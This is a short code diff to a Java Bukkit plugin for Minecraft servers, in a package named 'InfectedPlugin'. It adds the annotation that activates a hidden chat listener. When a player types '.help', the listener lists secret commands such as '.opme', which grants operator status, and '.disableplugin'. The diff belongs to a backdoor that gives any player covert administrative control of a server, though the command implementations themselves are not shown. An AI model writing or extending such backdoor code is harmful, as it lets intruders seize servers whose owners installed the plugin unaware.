@@ -2,11 +2,12 @@ package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
+import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_help implements Listener
 {
+    @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
@@ -15,6 +16,7 @@ public class Command_help implements Listener
     
         if (message.toLowerCase().contains(".help"))
         {
+			p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
             p.sendMessage(ChatColor.AQUA + "Commands");
             p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
             p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
